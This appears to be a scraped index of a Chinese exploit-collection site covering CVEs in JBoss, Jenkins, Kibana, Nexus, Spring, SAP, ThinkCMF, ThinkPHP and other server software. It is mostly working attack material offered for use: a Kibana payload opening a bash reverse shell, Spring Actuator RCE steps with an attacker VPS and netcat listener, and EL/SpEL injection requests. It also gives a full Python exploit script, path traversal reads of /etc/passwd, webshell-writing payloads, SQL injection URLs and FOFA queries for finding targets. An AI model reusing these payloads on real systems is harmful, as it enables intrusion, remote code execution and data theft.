"},"JBoss/":{"url":"JBoss/","title":"J Boss","keywords":"","body":"应用简介 是一个基于J2EE的开放源代码的应用服务器。 相关资产 FOFA app=\"RedHat-JBoss\" 环境搭建 Docker POChouse all right reserved，powered by GitbookFile Modify: 2021-06-28 20:31:33 "},"JBoss/JBoss 5.x-6.x 反序列化漏洞（CVE-2017-12149）/":{"url":"JBoss/JBoss 5.x-6.x 反序列化漏洞（CVE-2017-12149）/","title":"JBoss 5.x-6.x 反序列化漏洞（CVE-2017-12149）","keywords":"","body":"漏洞概述 JBoss 的 HttpInvoker 组件中的 ReadOnlyAccessFilter 过滤器中。该过滤器在没有进行任何安全检查的情况下尝试将来自客户端的数据流进行反序列化，从而导致了漏洞。 影响范围 JBoss AS 5.X JBoss AS 6.X EXP 图形化利用工具 jboss_CVE-2017-12149.jar @YunXu POChouse all right reserved，powered by GitbookFile Modify: 2021-06-28 20:31:33 "},"Jellyfin/":{"url":"Jellyfin/","title":"Jellyfin","keywords":"","body":"应用简介 Jellyfin 是一种免费软件媒体系统，可让您控制管理和流式传输媒体。 官方网站：https://jellyfin.org 官方文档：https://jellyfin.org/docs 相关资产 FOFA app=\"Jellyfin\" 环境搭建 1、参考官方文档安装 2、Docker一键开启环境 POChouse all right reserved，powered by GitbookFile Modify: 2021-06-28 20:31:33 "},"Jellyfin/任意文件读取漏洞（CVE-2021-21402）/":{"url":"Jellyfin/任意文件读取漏洞（CVE-2021-21402）/","title":"任意文件读取漏洞（CVE-2021-21402）","keywords":"","body":"影响范围 Jellyfin POC #单个url测试 python3 CVE-2021-21402.py -u http://127.0.0.1:1111 #批量检测 python3 CVE-2021-21402.py -f url.txt EXP GET /Audio/1/hls/..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Cwin.ini/stream.mp3/ Host:xxx.xxx.xxx.xxx Content-Type: application/octet-stream POChouse all right reserved，powered by GitbookFile Modify: 2021-06-28 20:31:33 "},"Jenkins/":{"url":"Jenkins/","title":"Jenkins","keywords":"","body":"应用简介 Jenkins是一个开源软件项目，是基于Java开发的一种持续集成工具，用于监控持续重复的工作 官方网站：https://www.jenkins.io 默认管理：admin/（密码是32位数字加小写字母） 未授权访问GetShell：@C0ldCash 相关资产 FOFA app=\"Jenkins\" 环境搭建 参考官网Docker POChouse all right reserved，powered by GitbookFile Modify: 2021-06-28 20:31:33 "},"Jenkins/Jenkins 远程命令执行漏洞（CVE-2018-1000861）/":{"url":"Jenkins/Jenkins 远程命令执行漏洞（CVE-2018-1000861）/","title":"Jenkins 远程命令执行漏洞（CVE-2018-1000861）","keywords":"","body":"漏洞概述 Jenkins在沙盒中执行Groovy前会先检查脚本是否有错误，检查操作是没有沙盒的，攻击者可以通过Meta-Programming的方式，在检查这个步骤时执行任意命令。 影响范围 Jenkins version EXP $ curl -s -I http://jenkins/| grep X-Jenkins X-Jenkins: 2.137 X-Jenkins-Session: 20f72c2e X-Jenkins-CLI-Port: 50000 X-Jenkins-CLI2-Port: 50000 $ python exp.py http://jenkins/ 'curl orange.tw' [*] ANONYMOUS_READ disable! [*] Bypass with CVE-2018-1000861! [*] Exploit success!(it should be :P) POChouse all right reserved，powered by GitbookFile Modify: 2021-06-28 20:31:33 "},"Jenkins/Jenkins-CI 远程代码执行漏洞（CVE-2017-1000353）/":{"url":"Jenkins/Jenkins-CI 远程代码执行漏洞（CVE-2017-1000353）/","title":"Jenkins-CI 远程代码执行漏洞（CVE-2017-1000353）","keywords":"","body":"漏洞概述 攻击者使用该漏洞可以在被攻击服务器执行任意代码，漏洞利用不需要任何的权限 影响范围 Jenkins 漏洞利用 1、下载CVE-2017-1000353-1.1-SNAPSHOT-all.jar，这是生成POC的工具 执行下面命令，生成字节码文件 java -jar CVE-2017-1000353-1.1-SNAPSHOT-all.jar jenkins_poc.ser \"touch /tmp/success\" # jenkins_poc.ser是生成的字节码文件名 # \"touch ...\"是待执行的任意命令 2、将刚才生成的字节码文件发送给目标 python CVE-2017-1000353.py http://your-ip:8080 jenkins_poc.ser POChouse all right reserved，powered by GitbookFile Modify: 2021-06-28 20:31:33 "},"Jira/":{"url":"Jira/","title":"Jira","keywords":"","body":"应用简介 一站式研发管理平台。 JIRA是Atlassian公司出品的项目与事务跟踪工具，被广泛应用于缺陷跟踪、客户服务、需求收集、流程审批、任务跟踪、项目跟踪和敏捷管理等工作领域。 相关资产 FOFA app=\"Jira\" && country=\"CN\" 环境搭建 1、最详细的JIRA搭建步骤详解 2、Docker POChouse all right reserved，powered by GitbookFile Modify: 2021-06-28 20:31:33 "},"Joomla/":{"url":"Joomla/","title":"Joomla","keywords":"","body":"应用简介 Joomla是一套全球知名的CMS系统，可以在多种不同的平台上部署并运行 中文官网：https://downloads.joomla.org/zh-cn/ 相关资产 FOFA app=\"Joomla\" 环境搭建 Docker POChouse all right reserved，powered by GitbookFile Modify: 2021-06-28 20:31:33 "},"Joomla/Joomla 3.9.17 后台RCE（CVE-2020-11890）/":{"url":"Joomla/Joomla 3.9.17 后台RCE（CVE-2020-11890）/","title":"Joomla 3.9.17 后台RCE（CVE-2020-11890）","keywords":"","body":"影响范围 需要密码 Joomla 漏洞利用EXP python CVE-2020-11890.py -url xxx.xxx.xxx.xxx -u username -p pass POChouse all right reserved，powered by GitbookFile Modify: 2021-06-28 20:31:33 "},"Joomla/Joomla 3.9.24 普通管理员RCE（CVE-2021-23132 ）/":{"url":"Joomla/Joomla 3.9.24 普通管理员RCE（CVE-2021-23132 ）/","title":"Joomla 3.9.24 普通管理员RCE（CVE-2021-23132 ）","keywords":"","body":"影响范围 3.0.0 EXP python CVE-2021-23132.py -url http://192.168.72.140 -u admin -p 1234 -rce 1 -cmd ls POChouse all right reserved，powered by GitbookFile Modify: 2021-06-28 20:31:33 "},"Kibana/":{"url":"Kibana/","title":"Kibana","keywords":"","body":"应用简介 Kibana是一个开源的分析与可视化平台，设计出来用于和Elasticsearch一起使用的。 Elasticsearch、Logstash和Kibana这三个技术就是我们常说的ELK技术栈，是大数据领域中一个很巧妙的设计。 官方网站：https://www.elastic.co/cn/kibana 相关资产 FOFA app=\"elastic-Kibana\" 环境搭建 https://www.jianshu.com/p/8001ac47c378 POChouse all right reserved，powered by GitbookFile Modify: 2021-06-28 20:31:33 "},"Kibana/CVE-2019-7609/":{"url":"Kibana/CVE-2019-7609/","title":"CVE 2019 7609","keywords":"","body":"影响范围 kibana = 5.6.15 kibana POC nuceli -tags kibana -t cves/ -l urls.txt EXP .es(*).props(label.__proto__.env.AAAA='require(\"child_process\").exec(\"bash -c \\'bash -i>& /dev/tcp/127.0.0.1/6666 0>&1\\'\");//') .props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ') 脚本 python CVE-2019-7609.py -u http://xxx.com -host vps-ip -port vps-port --shell optional arguments: -h, --help show this help message and exit -u URL such as: http://127.0.0.1:5601 -host REMOTE_HOST reverse shell remote host: such as: 1.1.1.1 -port REMOTE_PORT reverse shell remote port: such as: 8888 --shell reverse shell after verify POChouse all right reserved，powered by GitbookFile Modify: 2021-06-28 20:31:33 "},"Nacos/":{"url":"Nacos/","title":"Nacos","keywords":"","body":"应用简介 Nacos 提供了一组简单易用的特性集，帮助您快速实现动态服务发现、服务配置、服务元数据及流量管理。 服务（Service）是 Nacos 世界的一等公民。Nacos 支持几乎所有主流类型的“服务”的发现、配置和管理。 官方文档：https://nacos.io/zh-cn/docs/what-is-nacos.html 默认口令：nacos/nacos 相关资产 FOFA body=\"Alibaba Group Holding\" && country=\"CN\" icon_hash=\"1227052603\" body=\"console1412.css\" POChouse all right reserved，powered by GitbookFile Modify: 2021-06-28 20:31:33 "},"Nacos/Nacos未授权访问（CVE-2020-19676）/":{"url":"Nacos/Nacos未授权访问（CVE-2020-19676）/","title":"Nacos未授权访问（CVE-2020-19676）","keywords":"","body":"影响范围 Nacos POC java -jar Nacos-Unauthorized.jar 参考资料 Alibaba Nacos 未授权访问漏洞 POChouse all right reserved，powered by GitbookFile Modify: 2021-06-28 20:31:33 "},"Nexus/":{"url":"Nexus/","title":"Nexus","keywords":"","body":"应用简介 Nexus 是一个强大的 maven 仓库管理器，它极大的简化了本地内部仓库的维护和外部仓库的访问。 提供了强大的构件搜索功能，它基于REST，占用较少的内存，基于简单文件系统而非数据库。 官方网站：https://www.sonatype.com 默认账户：admin/admin123 相关应用 FOFA app=\"Nexus-Repository-Manager\" 环境搭建 下载 Docker 镜像： docker pull sonatype/nexus3:3.21.1 创建 nexus 数据存储目录： mkdir /your-dir/nexus-data 运行 Docker 镜像，并且开启调试端口，其中 8081 为 web 访问端口，5050 端口为远程调试端口： docker run -d --rm -p 8081:8081 -p 5050:5050 --name nexus -v /your-dir/nexus-data:/nexus-data -e INSTALL4J_ADD_VM_PARAMS=\"-Xms2g -Xmx2g -XX:MaxDirectMemorySize=3g -Djava.util.prefs.userRoot=/nexus-data -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=5050\" sonatype/nexus3:3.21.1 下载 Nexus 源码，并且切换至 3.21.0-05 分支： git clone https://github.com/sonatype/nexus-public.git git checkout -b release-3.21.0-05 origin/release-3.21.0-05 IDEA 导入项目并且配置远程调试信息 POChouse all right reserved，powered by GitbookFile Modify: 2021-06-28 20:31:33 "},"Nexus/Nexus Repository Manager 3 访问控制缺失及远程代码执行漏洞（CVE-2019-7238）/":{"url":"Nexus/Nexus Repository Manager 3 访问控制缺失及远程代码执行漏洞（CVE-2019-7238）/","title":"Nexus Repository Manager 3 访问控制缺失及远程代码执行漏洞（CVE-2019-7238）","keywords":"","body":"漏洞概述 由于 Nexus Repository Manager 3 访问控制措施缺失，未授权的用户可利用该问题构造特定请求在服务器上执行 Java 代码，从而达到远程代码执行的目的，影响系统安全。 影响范围 Nexus Repository Manager OSS/Pro 3.6.2~3.14.0 EXP CVE-2019-7238.jar 图形化检测工具 POChouse all right reserved，powered by GitbookFile Modify: 2021-06-28 20:31:33 "},"Nexus/Nexus Repository Manager 3 远程命令执行漏洞（CVE-2020-10204）/":{"url":"Nexus/Nexus Repository Manager 3 远程命令执行漏洞（CVE-2020-10204）/","title":"Nexus Repository Manager 3 远程命令执行漏洞（CVE-2020-10204）","keywords":"","body":"漏洞概述 2020 年 3 月 31 日 Nexus Repository Manager 官方发布了 CVE-2020-10199 CVE-2020-10204 的漏洞通告信息，两个漏洞均是由 Github Secutiry Lab 的是 @pwntester 发现的。 这两个漏洞主要是由于可执行恶意 EL表达式 导致的。 CVE-2020-10199 的最终触发是通过给 HelperBean 的 message 进行 EL表达式 注入。 CVE-2020-10204 的主要原因是在org.sonatype.nexus.security.privilege.PrivilegesExistValidator 或 org.sonatype.nexus.security.role.RolesExistValidator 类中，会对不存在的 privilege 或 role 抛出错误，而在错误信息抛出的时候，会存在一个 EL表达式 的渲染，会提取其中的el表达式并执行，从而造成 EL表达式 注入。 影响范围 Nexus Repository Manager 3.x OSS/Pro POC CVE-2020-10199-10204.jar 图形化检测工具 登录进入后台； 获取登录后的cookie及scrf属性； 打开本工具，填写相关信息，点击检测即可。 EXP_CVE-2020-10199 需要普通用户权限 POST /service/rest/beta/repositories/go/group HTTP/1.1 Host: 127.0.0.1:8081 Content-Length: 195 X-Requested-With: XMLHttpRequest X-Nexus-UI: true User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36 NX-ANTI-CSRF-TOKEN: 0.7886248393834028 Content-Type: application/json Accept: */* Origin: http://127.0.0.1:8081 Sec-Fetch-Site: same-origin Sec-Fetch-Mode: cors Referer: http://127.0.0.1:8081/ Accept-Encoding: gzip, deflate, br Accept-Language: zh-CN,zh;q=0.9 Cookie: jenkins-timestamper-offset=-28800000; Hm_lvt_8346bb07e7843cd10a2ee33017b3d627=1583249520; NX-ANTI-CSRF-TOKEN=0.7886248393834028; NXSESSIONID=396e7352-f76c-4bdd-9833-98d7990dca3b Connection: close { \"name\": \"internal\", \"online\": true, \"storage\": { \"blobStoreName\": \"default\", \"strictContentTypeValidation\": true }, \"group\": { \"memberNames\": [\"$\\\\A{''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(null).exec('touch /tmp/cve-2020-10199')}\"] } } EXP_CVE-2020-10204 利用更新用户接口： POST /service/extdirect HTTP/1.1 Host: 127.0.0.1:8081 Content-Length: 301 accept: application/json Sec-Fetch-Dest: empty User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36 NX-ANTI-CSRF-TOKEN: 0.16936373694860252 Content-Type: application/json Origin: http://127.0.0.1:8081 Sec-Fetch-Site: same-origin Sec-Fetch-Mode: cors Referer: http://127.0.0.1:8081/swagger-ui/?_v=3.21.1-01&_e=OSS Accept-Encoding: gzip, deflate, br Accept-Language: zh-CN,zh;q=0.9 Cookie: jenkins-timestamper-offset=-28800000; Hm_lvt_8346bb07e7843cd10a2ee33017b3d627=1583249520; NX-ANTI-CSRF-TOKEN=0.16936373694860252; NXSESSIONID=4e5437b3-7755-4784-bda6-d004e8f589fb Connection: close {\"action\":\"coreui_User\",\"method\":\"update\",\"data\":[{\"userId\":\"www\",\"version\":\"2\",\"firstName\":\"www\",\"lastName\":\"www\",\"email\":\"www@qq.com\",\"status\":\"active\",\"roles\":[\"$\\\\A{''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(null).exec('touch /tmp/cve-2020-10204')}\"]}],\"type\":\"rpc\",\"tid\":9} 利用创建角色接口: POST /service/extdirect HTTP/1.1 Host: 127.0.0.1:8081 Content-Length: 294 accept: application/json Sec-Fetch-Dest: empty User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36 NX-ANTI-CSRF-TOKEN: 0.856555763510765 Content-Type: application/json Origin: http://127.0.0.1:8081 Sec-Fetch-Site: same-origin Sec-Fetch-Mode: cors Referer: http://127.0.0.1:8081/swagger-ui/?_v=3.21.1-01&_e=OSS Accept-Encoding: gzip, deflate, br Accept-Language: zh-CN,zh;q=0.9 Cookie: jenkins-timestamper-offset=-28800000; Hm_lvt_8346bb07e7843cd10a2ee33017b3d627=1583249520; NX-ANTI-CSRF-TOKEN=0.856555763510765; NXSESSIONID=da418706-f4e4-468e-93ac-de9c46802f11 Connection: close {\"action\":\"coreui_Role\",\"method\":\"create\",\"data\":[{\"version\":\"\",\"source\":\"default\",\"id\":\"1111\",\"name\":\"2222\",\"description\":\"3333\",\"privileges\":[\"$\\\\A{''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(null).exec('touch /tmp/cve-2020-10204')}\"],\"roles\":[]}],\"type\":\"rpc\",\"tid\":89} POChouse all right reserved，powered by GitbookFile Modify: 2021-06-28 20:31:33 "},"phpMyAdmin/":{"url":"phpMyAdmin/","title":"Php My Admin","keywords":"","body":"应用简介 phpMyAdmin是MySQL管理工具 默认密码 默认 phpMyAdmin：用户名 root、密码 root 或空登陆 版本 2.11.3～2.11.4：用户名 'localhost'@'@\" 登陆，无需密码 版本 2.11.9.2：用户名 root 登陆，无需密码 [CVE-2018-12613]-远程文件包含 漏洞概述 #影响范围 4.8.0 4.8.1 漏洞利用 POC http://127.0.0.1/phpMyAdmin-4.8.0/index.php?target=db_sql.php%253f/../../../../../../../../../../../../../../../../../../../../../../../phpStudy/PHPTutorial/WWW/phpinfo.php 遇到该漏洞,可以考虑自己写一个shell,然后去包含自己的sessionid来实现getshell [CVE-2020-5504]-后台SQL注入 漏洞概述 #影响范围 漏洞利用 POC http://127.0.0.1/server_privileges.php?ajax_request=true&validate_username=1&username=1%27and%20extractvalue(1,concat(0x7e,(select%20user()),0x7e))--+db=&token=c2064a8c5f437da931fa01de5aec6581&viewing_mode=server php爆绝对路径 单引号爆路径 xx.php?id=1' 错误参数值爆路径 xxx.php?id=-1 Google爆路径 Site:xxx.edu \"warning\" Site:xxx.com \"fatal error\" 测试文件爆路径 test.php ceshi.php info.php phpinfo.php php_info.php 1.php phpmyadmin爆路径 /phpMyAdmin/index.php?lang[]=1 /phpmyadmin/themes/darkblue_orange/layout.inc.php /phpmyadmin/libraries/lect_lang.lib.php /phpmyadmin/libraries/select_lang.lib.php /phpmyadmin/libraries/lect_lang.lib.php /phpmyadmin/libraries/mcrypt.lib.php 配置文件找路径 Windows: c:\\windows\\php.ini php配置文件 c:\\windows\\system32\\inetsrv\\MetaBase.xml IIS虚拟主机配置文件 Linux: /etc/php.ini php配置文件 /etc/httpd/conf.d/php.conf /etc/httpd/conf/httpd.conf Apache配置文件 /usr/local/apache/conf/httpd.conf /usr/local/apache2/conf/httpd.conf /usr/local/apache/conf/extra/httpd-vhosts.conf 虚拟目录配置文件 nginx文件类型错误解析爆路径 www.xxx.com/xx.jpg/x.php phpMyAdmin利用日志写shell set global general_log='on' --开启日志 set global general_log_file =\"C:/phpStudy/PHPTutorial/WWW/shell.php\" --日志写入的文件 select \"\" --执行带有一句话的sql语句 其它写shell方法也和mysql写shell一样 POChouse all right reserved，powered by GitbookFile Modify: 2021-06-28 20:31:33 "},"SAP/":{"url":"SAP/","title":"SAP","keywords":"","body":"应用简介 SAP NetWeaver是SAP的集成技术平台，是自从SAP Business Suite以来的所有SAP应用的技术基础。SAP NetWeaver是一个面向服务的应用和集成平台,为SAP的应用提供开发和运行环境，也可以用来和其它应用和系统进行自定义的开发和集成。 影响范围 FOFA app=\"SAP-Web-Application-Server\" && server=\"as java\" title=\"SAP NetWeaver Application Server Java\" || body=\"SAP_logo.gif\" POChouse all right reserved，powered by GitbookFile Modify: 2021-06-28 20:31:33 "},"SAP/SAP NetWeaver AS JAVA 任意用户添加/":{"url":"SAP/SAP NetWeaver AS JAVA 任意用户添加/","title":"SAP NetWeaver AS JAVA 任意用户添加","keywords":"","body":"漏洞概述 在SAP NetWeaver AS Java 的LM配置向导中缺乏身份验证，未经身份验证的远程攻击者可以执行有危害的操作，包括但不限于创建管理员用户。攻击者可能获得对adm的访问权限，adm是操作系统用户，它可以无限制地访问与SAP系统相关的所有本地资源。 影响范围 SAP NetWeaver AS JAVA（LM Configuration Wizard）7.30 SAP NetWeaver AS JAVA（LM Configuration Wizard）7.31 SAP NetWeaver AS JAVA（LM Configuration Wizard）7.40 SAP NetWeaver AS JAVA（LM Configuration Wizard）7.50 POC nuceli -tags sap -t cves/ -l urls.txt EXP python CVE-2020-6287.py http://vul-IP:50000/ test123 test@123123 EXP (RECON.py) chipik/SAP_RECON Just point SAP NW AS Java hostnmae/ip. There is additional options: -c - check if SAP server is vulnerable to RECON -f - download zip file from SAP server -u - create user SAP JAVA user with Authenticated User role -a - create user SAP JAVA user with Administrator role Ex.: Download zip file python RECON.py -H 172.16.30.8 -f /1111.zip Check1 - Vulnerable! - http://172.16.30.8:50000/CTCWebService/CTCWebServiceBean Ok! File zipfile_929.zip was saved Ex.: Create SAP JAVA user ~python RECON.py -H 172.16.30.8 -u Check1 - Vulnerable! - http://172.16.30.8:50000/CTCWebService/CTCWebServiceBean Going to create new user. sapRpoc5484:Secure!PwD9379 Ok! User were created Ex.: Create SAP JAVA Administrator user ~python RECON.py -H 172.16.30.8 -a Check1 - Vulnerable! [CVE-2020-6287] (RECON) - http://172.16.30.8:50000/CTCWebService/CTCWebServiceBean Going to create new user sapRpoc5574:Secure!PwD7715 with role 'Administrator' Ok! Admin user were created POChouse all right reserved，powered by GitbookFile Modify: 2021-06-28 20:31:33 "},"Spring/spring.html":{"url":"Spring/spring.html","title":"Spring","keywords":"","body":"应用简介 Spring 是最受欢迎的企业级 Java 应用程序开发框架 Spring Messaging 远程命令执行漏洞（CVE-2018-1270） Spring Boot 2.x Actuator配置不当RCE漏洞复现 https://xz.aliyun.com/t/7480 Spring Boot漏洞复现 https://xz.aliyun.com/t/7811 [CVE-2018-1273]-Spring Data Commons 远程命令执行漏洞 在注册的时候抓包，并修改成如下数据包 POC POST /users?page=&size=5 HTTP/1.1 Host: localhost:8080 Connection: keep-alive Content-Length: 124 Pragma: no-cache Cache-Control: no-cache Origin: http://localhost:8080 Upgrade-Insecure-Requests: 1 Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8 Referer: http://localhost:8080/users?page=0&size=5 Accept-Encoding: gzip, deflate, br Accept-Language: zh-CN,zh;q=0.9,en;q=0.8 username[#this.getClass().forName(\"java.lang.Runtime\").getRuntime().exec(\"touch /tmp/success\")]=&password=&repeatedPassword= EXP #!/usr/bin/python3 #-*- coding:utf-8 -*- # author:zhzyker # from:https://github.com/zhzyker/exphub # telegram:t.me/zhzyker import requests import sys if len(sys.argv)!=3: print('+----------------------------------------------------------------------------+') print('+ DES: by zhzyker as https://github.com/zhzyker/exphub +') print('+ Spring Data Commons Remote Code Execution (No display) +') print('+----------------------------------------------------------------------------+') print('+ USE: python3 cve-2018-1273_cmd.py \"\" +') print('+ EXP: python3 cve-2018-1273_cmd.py http://1.1.1.1:8080 \"touch /tmp/exphub\" +') print('+ VER: Spring Data Commons 1.13 to 1.13.10 +') print('+ Spring Data Commons 2.0 to 2.0.5 +') print('+----------------------------------------------------------------------------+') sys.exit() url = sys.argv[1] cmd = sys.argv[2] vuln = url + \"/users\" headers = { 'Host': \"localhost:8080\", 'Connection': \"keep-alive\", 'Content-Length': \"120\", 'Pragma': \"no-cache\", 'Cache-Control': \"no-cache\", 'Origin': \"http://localhost:8080\", 'Upgrade-Insecure-Requests': \"1\", 'Content-Type': \"application/x-www-form-urlencoded\", 'User-Agent': \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36\", 'Accept': \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\", 'Referer': \"http://localhost:8080/users?page=0&size=5\", 'Accept-Encoding': \"gzip, deflate, br\", 'Accept-Language': \"zh-CN,zh;q=0.9,en;q=0.8\" } payload = \"username[#this.getClass().forName('java.lang.Runtime').getRuntime().exec('%s')]=&password=&repeatedPassword=\" % cmd try: r = requests.post(vuln, data=payload, headers=headers) if r.status_code == 500: print (\"[+] Code executed successfully\") else: print (\"[-] Target Not CVE-2018-1273 Vuln, Good Luck\") except: print (\"[-] Target Not CVE-2018-1273 Vuln, Good Luck\") python cve-2018-1273_cmd.py \"\" [CVE-2020-5410]-Spring Cloud Config 目录穿越 影响版本： 2.2.0 to 2.2.2 2.1.0 to 2.1.8 poc： curl http://127.0.0.1:8888/..%252F..%252Fetc%252Fpasswd%23/CESHI POChouse all right reserved，powered by GitbookFile Modify: 2021-06-28 20:31:33 "},"Spring/Spring Boot Actuator 未授权访问/":{"url":"Spring/Spring Boot Actuator 未授权访问/","title":"Spring Boot Actuator 未授权访问","keywords":"","body":"漏洞概述 Actuator是Spring Boot提供的服务监控和管理中间件，默认配置会出现接口未授权访问，部分接口会泄露网站流量信息和内存信息等，使用Jolokia库特性甚至可以远程执行任意代码，获取服务器权限。 影响范围 Spring Boot 端点功能描述 每个端点的功能描述 路径 描述 /autoconfig 提供了一份自动配置报告，记录哪些自动配置条件通过了，哪些没通过 /beans 描述应用程序上下文里全部的Bean，以及它们的关系 /env 获取全部环境属性 /configprops 描述配置属性(包含默认值)如何注入Bean /dump 获取线程活动的快照 /health 报告应用程序的健康指标，这些值由HealthIndicator的实现类提供 /info 获取应用程序的定制信息，这些信息由info打头的属性提供 /mappings 描述全部的URI路径，以及它们和控制器(包含Actuator端点)的映射关系 /metrics 报告各种应用程序度量信息，比如内存用量和HTTP请求计数 /shutdown 关闭应用程序，要求endpoints.shutdown.enabled设置为true /trace 提供基本的HTTP请求跟踪信息(时间戳、HTTP头等) Spring Boot 1.x 版本端点在根URL下注册 http://xxx.com/env Spring Boot 2.x 版本端点移动到/actuator/路径 http://xxx.com/actuator/env 实战中端点可能存放在多级目录下 端点利用 端点 利用方式 trace 获取到近期服务器收到的请求信息，伪造cookie进行登录 env 数据库账户等环境配置信息泄漏 heapdump 信息下载 env端点配置不当造成RCE 条件：Eureka-Client 需要以下两个包 spring-boot-starter-actuator（/refresh刷新配置需要） spring-cloud-starter-netflix-eureka-client（功能依赖） 1、在vps服务器运行恶意构造的脚本 python env.py 2、在VPS用NC监听 nc -lvnp 1234 3、写入配置，访问/env端点 抓包将get请求改为post请求，post内容为（该ip为脚本启动的机器的ip）： eureka.client.serviceUrl.defaultZone=http://VPS-IP:2222/xstream 然后再访问/refresh,抓包将get请求更改为post请求，post数据随意 POST /refresh SpringBoot heapdump信息泄露利用 SpringBoot heapdump可下载，导致泄露数据库连接信息以及Ali OSS key信息 1、访问以下路径能成功下载 heapdump https://xxx.com//actuator/heapdump 2、使用VisualVM打开heapdump文件 点击Objects查看泄露的信息（可过滤） 得到alioss key之后即可使用OSS Browser登录到OSS Jolokia漏洞利用（RCE） https://xz.aliyun.com/t/7811 POChouse all right reserved，powered by GitbookFile Modify: 2021-06-28 20:31:33 "},"Spring/Spring Cloud Config Server目录遍历（CVE-2020-5410）/":{"url":"Spring/Spring Cloud Config Server目录遍历（CVE-2020-5410）/","title":"Spring Cloud Config Server目录遍历（CVE-2020-5410）","keywords":"","body":"漏洞概述 Spring Cloud Config、2.2.3 之前的 2.2.x 版、2.1.9 之前的 2.1.x 版以及不受支持的旧版本允许应用程序通过 spring-cloud-config-server 模块提供任意配置文件。恶意用户或攻击者可以使用特制的 URL 发送请求，从而导致目录遍历攻击。 影响范围 Spring Cloud Config 2.1.0 to 2.1.8 2.2.0 to 2.2.2 POC name: poc-yaml-spring-cloud-cve-2020-5410 rules: - method: GET path: >- /..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd%23/a expression: | response.status == 200 && \"root:[x*]:0:0:\".bmatches(response.body) detail: author: Soveless(https://github.com/Soveless) Affected Version: \"Spring Cloud Config 2.2.x EXP /..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd%23/a POChouse all right reserved，powered by GitbookFile Modify: 2021-06-28 20:31:33 "},"Spring/Spring Data Commons 远程命令执行（CVE-2018-1273）/":{"url":"Spring/Spring Data Commons 远程命令执行（CVE-2018-1273）/","title":"Spring Data Commons 远程命令执行（CVE-2018-1273）","keywords":"","body":"漏洞概述 Spring Data Commons是Spring Data下所有子项目共享的基础框架。Spring Data Commons 在2.0.5及以前版本中，存在一处SpEL表达式注入漏洞，攻击者可以注入恶意SpEL表达式以执行任意命令。 影响范围 Spring Data Commons EXP @jas502n python CVE-2018-1273.py POChouse all right reserved，powered by GitbookFile Modify: 2021-06-28 20:31:33 "},"ThinkCMF/":{"url":"ThinkCMF/","title":"Think CMF","keywords":"","body":"应用简介 ThinkCMF是基于ThinkPHP框架开发的内容管理系统 ThinkCMF缓存Getshell漏洞 漏洞概述 由于thinkcmf2.x使用了thinkphp3.x作为开发框架，默认情况下启用了报错日志并且开启了模板缓存，导致可以使用加载一个不存在的模板来将生成一句话的PHP代码写入data/runtime/Logs/Portal目录下的日志文件中，再次包含该日志文件即可在网站根目录下生成一句话木马m.php 日志文件格式为YY_MM_DD.log，如当前日期为2019年12月12日，日志文件为19_12_12.log，完整路径为 data/runtime/Logs/Portal/19_12_12.log 漏洞利用 Payload1： 首先访问 http://target.domain/?a=display&templateFile=%3C?php%20file_put_contents(%27m.php%27,%27%3C%3fphp+eval($_POST[%22X%22])%3b%3F%3E%27);die();?%3E 然后请求 http://target.domain/?a=display&templateFile=data/runtime/Logs/Portal/YY_MM_DD.log 即可在 http://xxx.com/根目录生成m.php，密码是X Payload2: 首先访问 http://target.domain/?a=display&templateFile=%3C%3F%70%68%70%20%65%76%61%6C%28%24%5F%50%4F%53%54%5BX%5D%29%3B%3F%3E 然后菜刀连接 http://target.domain/?a=display&templateFile=data/runtime/Logs/Portal/YY_MM_DD.log 密码同样是X ThinkCMF框架任意文件包含 影响版本 ThinkCMF X1.6.0 ThinkCMF X2.1.0 ThinkCMF X2.2.0 ThinkCMF X2.2.1 ThinkCMF X2.2.2 ThinkCMF X2.2.3 漏洞利用 第一种： 通过构造a参数的fetch方法，可以不需要知道文件路径就可以把php代码写入文件phpinfo版payload ?a=fetch&templateFile=public/index&prefix=''&content=file_put_contents('test.php','') 第二种： 通过构造a参数的display方法，实现任意文件包含漏洞 ?a=display&templateFile=README.md POChouse all right reserved，powered by GitbookFile Modify: 2021-06-28 20:31:33 "},"ThinkPHP/":{"url":"ThinkPHP/","title":"Think PHP","keywords":"","body":"应用简介 ThinkPHP是国内一款常用的PHP后台开发框架。 GUI图形化利用工具 @bewhale [ThinkPHP 3.2]-SQL注入 漏洞利用 --table http://127.0.0.1/index.php?m=Home&c=Index&a=test&id[table]=user where%201%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)-- --alias http://127.0.0.1/index.php?m=Home&c=Index&a=test&id[alias]=where%201%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)-- --where: http://127.0.0.1/index.php?m=Home&c=Index&a=test&id[where]=1%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)-- [ThinkPHP 5.x]-命令执行漏洞 漏洞概述 #影响范围 5.0 由于框架对控制器名没有进行足够的检测会导致在没有开启强制路由的情况下可能的getshell漏洞，受影响的版本包括5.0和5.1版本，推荐尽快更新到最新版本。 漏洞利用 phpinfo： ?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1 